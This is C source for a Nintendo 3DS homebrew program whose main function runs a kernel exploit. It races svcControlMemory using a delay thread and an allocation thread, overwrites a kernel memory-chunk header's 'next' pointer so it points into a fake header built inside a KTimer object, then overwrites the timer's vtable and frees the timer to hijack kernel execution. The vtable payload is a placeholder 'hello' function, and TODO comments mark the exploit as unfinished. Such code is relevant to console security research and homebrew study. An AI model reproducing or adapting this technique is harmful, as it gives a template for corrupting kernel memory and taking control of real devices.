#include <3ds.h>

#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>

#define PAGE_SIZE 0x1000

typedef struct {
    void* vtable;
    u32 refCount;
    u32 syncedThreads;
    void* firstThreadNode;
    void* lastThreadNode;
    void* timerInterruptVtable;
    void* interruptObject;
    s64 suspendTime;
    u8 timerEnabled;
    u8 resetType;
    u16 unused;
    s64 interval;
    s64 initial;
    void* owner;
} KTimer;

typedef struct {
    u32 size;
    void* next;
    void* prev;
} MemChunkHdr;

extern u32 __ctru_heap;
extern u32 __ctru_heap_size;

static volatile Result control_res = -1;

// Test function, please ignore.
static void hello() {
    printf("Hello world!\n");
}

// Test vtable, please ignore.
static void* vtable[16] = {
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello
};

// Thread function to slow down svcControlMemory execution.
static void delay_thread(void* arg) {
    // Slow down thread execution until the control operation has completed.
    while(control_res == -1) {
        svcSleepThread(10000);
    }
}

// Thread function to allocate memory pages.
static void allocate_thread(void* arg) {
    u32* memInfo = (u32*) arg;
    if(memInfo == NULL) {
        // Don't try to use invalid memory information.
        return;
    }

    // Allocate the requested pages.
    u32 tmp;
    control_res = svcControlMemory(&tmp, memInfo[0], 0, memInfo[1], MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));

    // Free memory information.
    free(memInfo);
}

// Maps pages with chunk headers present.
static void map_raw_pages(u32 memAddr, u32 memSize) {
    // Reset control result.
    control_res = -1;

    // Prepare memory information.
    u32* memInfo = (u32*) malloc(sizeof(u32) * 2);
    memInfo[0] = memAddr;
    memInfo[1] = memSize;

    // Retrieve arbiter.
    Handle arbiter = __sync_get_arbiter();

    // Create thread to slow down svcControlMemory execution. Yes, this is ugly, but it works.
    threadCreate(delay_thread, NULL, 0x4000, 0x18, 1, true);
    // Create thread to allocate pages.
    threadCreate(allocate_thread, memInfo, 0x4000, 0x3F, 1, true);

    // Use svcArbitrateAddress to detect when the memory page has been mapped.
    while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN, 0, 0) == 0xD9001814);
}

// Waits for the memory mapping thread to complete.
static void wait_map_complete() {
    // Wait for the control result to be set.
    while(control_res == -1) {
        svcSleepThread(1000000);
    }
}

// Creates a timer and outputs its kernel object address from r2.
static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset_type, u32* kaddr) {
    asm volatile(
    "str r0, [sp, #-4]!\n"
    "str r2, [sp, #-4]!\n"
    "svc 0x1A\n"
    "ldr r3, [sp], #4\n"
    "str r2, [r3]\n"
    "ldr r2, [sp], #4\n"
    "str r1, [r2]\n"
    "bx lr"
    );
}

// Executes exploit.
void do_hax() {
    u32 tmp;

    // Allow threads on core 1.
    aptOpenSession();
    APT_SetAppCpuTimeLimit(30);
    aptCloseSession();

    // Create a timer, crafting a fake MemChunkHdr out of its data.
    // TODO: Do next/prev *need* to be non-zero?
    Handle timer;
    u32 timerAddr;
    svcCreateTimerKAddr(&timer, 0, &timerAddr);
    svcSetTimer(timer, 0, 0);

    KTimer* timerObj = (KTimer*) (timerAddr - 4);
    MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->timerEnabled;

    // Debug output.
    printf("Timer address: 0x%08X\n", (int) timerAddr);

    // Prepare memory details.
    u32 memAddr = __ctru_heap + __ctru_heap_size;
    u32 memSize = PAGE_SIZE * 2;

    // Isolate a single page between others to ensure using the next chunk.
    svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
    svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
    svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);

    // Map the pages.
    map_raw_pages(memAddr, memSize);

    // Overwrite the header "next" pointer to our crafted MemChunkHdr within the timer.
    ((MemChunkHdr*) memAddr)->next = fakeHdr;

    // Debug output.
    printf("Post-overwrite control result: 0x%08X\n", (int) control_res);

    // Wait for memory mapping to complete.
    wait_map_complete();

    // Debug output.
    printf("Final control result: 0x%08X\n", (int) control_res);

    // Overwrite the timer's vtable with our own.
    // TODO: This needs to be a kernel virtual address.
    void*** vtablePtr = (void***) (memAddr + PAGE_SIZE + ((u32) timerObj - ((u32) timerObj & ~0xFFF)));
    *vtablePtr = vtable;

    // Free the timer.
    svcCloseHandle(timer);

    // Free the allocated pages.
    svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_FREE, MEMPERM_DONTCARE);
    svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
}

int main(int argc, char **argv) {
    gfxInitDefault();
    consoleInit(GFX_TOP, NULL);

    do_hax();

    printf("Press START to exit.\n");

    while(aptMainLoop()) {
        hidScanInput();
        if(hidKeysDown() & KEY_START) {
            break;
        }

        gfxFlushBuffers();
        gfxSwapBuffers();
        gspWaitForVBlank();
    }

    gfxExit();
    return 0;
}
